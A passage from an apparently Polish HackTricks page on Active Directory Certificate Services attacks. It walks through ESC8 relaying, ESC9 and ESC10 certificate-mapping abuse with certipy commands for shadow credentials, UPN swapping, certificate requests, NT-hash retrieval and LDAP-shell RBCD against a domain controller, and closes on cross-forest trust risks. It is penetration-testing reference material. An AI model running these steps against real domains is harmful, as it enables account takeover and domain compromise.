Następnie można zastosować technikę taką jak [PetitPotam](https://github.com/ly4k/PetitPotam), aby wymusić uwierzytelnienie. W przypadku kontrolerów domeny, konieczne jest określenie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Brak rozszerzenia bezpieczeństwa - ESC9 <a href="#5485" id="5485"></a>

### Wyjaśnienie

Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, zwana ESC9, uniemożliwia osadzanie **nowego rozszerzenia bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`** w certyfikacie. Ta flaga staje się istotna, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (domyślne ustawienie), w przeciwieństwie do ustawienia `2`. Jej znaczenie wzrasta w scenariuszach, w których słabsze mapowanie certyfikatu dla Kerberos lub Schannel może być wykorzystane (jak w przypadku ESC10), ponieważ brak ESC9 nie zmieniłby wymagań.

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:
- `StrongCertificateBindingEnforcement` nie jest dostosowane do `2` (domyślnie jest to `1`), lub `CertificateMappingMethods` zawiera flagę `UPN`.
- Certyfikat jest oznaczony flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
- Certyfikat zawiera dowolne EKU uwierzytelniania klienta.
- Dostępne są uprawnienia `GenericWrite` dla dowolnego konta w celu kompromitacji innego konta.

### Przykład nadużycia

Załóżmy, że `John@corp.local` posiada uprawnienia `GenericWrite` dla `Jane@corp.local` i ma na celu skompromitowanie konta `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego `Jane@corp.local` ma prawo zapisu, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.

Początkowo, za pomocą Shadow Credentials, uzyskujemy skrót `Jane` dzięki uprawnieniom `GenericWrite` `John`a:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie `userPrincipalName` użytkownika `Jane` zostaje zmienione na `Administrator`, celowo pomijając część domeny `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, pod warunkiem, że `Administrator@corp.local` pozostaje odrębny jako `userPrincipalName` dla `Administratora`.

Następnie, szablon certyfikatu `ESC9`, oznaczony jako podatny na atak, jest żądany jako `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że pole `userPrincipalName` w certyfikacie odzwierciedla `Administrator`, bez żadnego "object SID".

`userPrincipalName` dla `Jane` zostaje przywrócone do jej pierwotnego wartości, czyli `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia przy użyciu wydanego certyfikatu zwraca teraz skrót NT dla `Administrator@corp.local`. Polecenie musi zawierać opcję `-domain <domain>`, ponieważ certyfikat nie zawiera informacji o domenie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Słabe mapowanie certyfikatów - ESC10

### Wyjaśnienie

ESC10 odnosi się do dwóch wartości klucza rejestru na kontrolerze domeny:

- Domyślna wartość dla `CertificateMappingMethods` w `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
- Domyślne ustawienie dla `StrongCertificateBindingEnforcement` w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.

**Przypadek 1**

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`.

**Przypadek 2**

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadki wykorzystania 1

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do kompromitowania dowolnego konta B.

Na przykład, mając uprawnienia `GenericWrite` dla `Jane@corp.local`, atakujący ma na celu skompromitowanie `Administrator@corp.local`. Procedura jest podobna do ESC9, pozwalając na wykorzystanie dowolnego szablonu certyfikatu.

Początkowo, za pomocą Shadow Credentials, wykorzystując `GenericWrite`, pobierany jest skrót `Jane`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie `userPrincipalName` użytkownika `Jane` zostaje zmienione na `Administrator`, celowo pomijając część `@corp.local`, aby uniknąć naruszenia ograniczenia.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie, żądane jest wygenerowanie certyfikatu umożliwiającego uwierzytelnianie klienta jako `Jane`, przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostaje przywrócone do pierwotnej wartości, czyli `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autoryzacja za pomocą uzyskanego certyfikatu ujawni NT hash `Administrator@corp.local`, co wymaga podania domeny w poleceniu ze względu na brak szczegółów dotyczących domeny w certyfikacie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Przypadek nadużycia 2

Z użyciem `CertificateMappingMethods`, które zawierają flagę `UPN` (`0x4`), konto A posiadające uprawnienia `GenericWrite` może skompromitować dowolne konto B, które nie ma właściwości `userPrincipalName`, włączając w to konta maszynowe i wbudowanego administratora domeny `Administrator`.

Celem jest skompromitowanie `DC$@corp.local`, zaczynając od uzyskania hasha `Jane` za pomocą Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` dla `Jane` jest następnie ustawione na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Wymagane jest wystawienie certyfikatu do uwierzytelniania klienta dla użytkownika `Jane` przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostaje przywrócone do pierwotnej wartości po tym procesie.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Aby uwierzytelnić się za pomocą Schannel, wykorzystuje się opcję `-ldap-shell` w narzędziu Certipy, co oznacza sukces uwierzytelnienia jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Za pomocą powłoki LDAP, polecenia takie jak `set_rbcd` umożliwiają ataki oparte na ograniczonym delegowaniu zasobów (RBCD), co potencjalnie narusza kontroler domeny.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta podatność dotyczy również każdego konta użytkownika, które nie ma `userPrincipalName` lub w którym nie pasuje do `sAMAccountName`, przy czym domyślnie `Administrator@corp.local` jest głównym celem ze względu na swoje podwyższone uprawnienia LDAP i brak domyślnego `userPrincipalName`.


## Kompromitacja lasów za pomocą certyfikatów wyjaśniona w stronie biernika

### Złamanie zaufania lasów przez skompromitowane CA

Konfiguracja dla **enrollmentu między lasami** jest stosunkowo prosta. **Certyfikat root CA** z lasu zasobów jest **publikowany w lasach kontowych** przez administratorów, a **certyfikaty enterprise CA** z lasu zasobów są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym lesie kontowym**. W celu wyjaśnienia, ta konfiguracja nadaje **CA w lesie zasobów pełną kontrolę** nad wszystkimi innymi lasami, którymi zarządza PKI. Jeśli ten CA zostanie **skompromitowany przez atakujących**, mogą oni **podrobić certyfikaty dla wszystkich użytkowników zarówno w lesie zasobów, jak i w lesie kontowym**, tym samym łamiąc granicę bezpieczeństwa lasu.

### Przyznawanie uprawnień do enrollmentu obcym podmiotom

W środowiskach wielolasowych należy zachować ostrożność w odniesieniu do Enterprise CA, które **publikują szablony certyfikatów**, które umożliwiają **uwierzytelnionym użytkownikom lub obcym podmiotom** (użytkownikom/grupom spoza lasu, do którego należy Enterprise CA) **prawo do enrollmentu i edycji**.\
Po uwierzytelnieniu w ramach zaufania, SID **uwierzytelnionych użytkowników** jest dodawany do tokena użytkownika przez AD. W związku z tym, jeśli domena posiada Enterprise CA z szablonem, który **umożliwia uwierzytelnionym użytkownikom prawo do enrollmentu**, szablon ten potencjalnie może być **zainstalowany przez użytkownika z innego lasu**. Podobnie, jeśli **prawa do enrollmentu są jawnie przyznawane obcemu podmiotowi przez szablon**, tworzony jest **międzylasowy związek kontroli dostępu**, umożliwiający podmiotowi z jednego lasu **zainstalowanie szablonu z innego lasu**.

Oba scenariusze prowadzą do **zwiększenia powierzchni ataku** z jednego lasu na drugi. Ustawienia szablonu certyfikatu mogą być wykorzystane przez atakującego do uzyskania dodatkowych uprawnień w obcym domenie.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
